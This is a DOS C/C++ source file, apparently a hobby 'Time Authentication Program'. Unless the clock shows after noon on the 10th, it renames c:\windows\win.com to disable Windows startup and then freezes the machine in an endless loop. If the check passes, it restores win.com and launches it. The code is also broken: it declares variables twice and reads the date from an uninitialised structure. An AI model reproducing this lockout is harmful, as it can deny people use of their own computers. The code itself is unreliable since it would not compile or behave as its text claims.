#include<process.h>
#include<dos.h>
#include<conio.h>
#include<stdio.h>
#include<fstream.h>
void main()
{
	struct date d;
	union REGS x,y;
	getdate(&d);
	int dd,mm,yy,hours,min,sec,i=5;
	struct date da;
	union REGS x,y;
	getdate(&d);
	dd = da.da_day ;
	mm = da.da_mon ;
	yy = da.da_year ;
	struct time t;
	gettime(&t);
	hours=t.ti_hour;
	min=t.ti_min;
	sec=t.ti_sec;
	textcolor(10);
	cprintf("                      Time Authentication Program By Madhur");
	cout<<endl;
	cprintf("                      =====================================");
	cout<<endl;
	textcolor(3);
	cprintf("\n\nGetting current time...");
	delay(1000);
	textcolor(11);
	cprintf("\n\n\rCurrent time is: ");
	textcolor(YELLOW);
	cprintf("%d:%d:%d",hours,min,sec);
	delay(1000);
	if(hours>12&&dd==10)
	{
	 ifstream myfile("c:\\windows\\win.com");
	 int j;
	 if(myfile==NULL)
	 {
		j=rename("c:\\windows\\win.old","c:\\windows\\win.com");
		if(j!=0)
		perror("rename");
	 }
	 textcolor(13+128);
	 cprintf("\r\n\nTime Successfully Authenticated...");
	 delay(1000);
	 textcolor(9+128);
	 cprintf("\n\n\rStarting System...");
	 textcolor(LIGHTGRAY);
	 system("c:\\windows\\win.com");

}
	 else
	 {
		textcolor(4+128);
		delay(1000);
		cprintf("\n\n\rAuthentication Failure...\n\rAccess Denied to System...");
		textcolor(12);
		ifstream myfile("c:\\windows\\win.old");
		if(myfile==NULL)
		{
		 int j;
		 j=rename("c:\\windows\\win.com","c:\\windows\\win.old");
		 if(j!=0)
		 perror("rename");
		}
	 textcolor(LIGHTRED);
		delay(2000);
		cprintf("\n\n\rThis program will now go into infinite loop.System will be halted");
	 cprintf("\n\n\rCurrent time is:\n\r");

		 while(1)
		 {
			gettime(&t);
				hours=t.ti_hour;
		 min=t.ti_min;
			sec=t.ti_sec;
				textcolor(YELLOW);
			cprintf("%d:%d:%d\r",hours,min,sec);
			gotoxy(11,0);
//			cout<<wherex();
 //			cout<<wherey();

			}
	}
 textcolor(LIGHTGRAY);

}




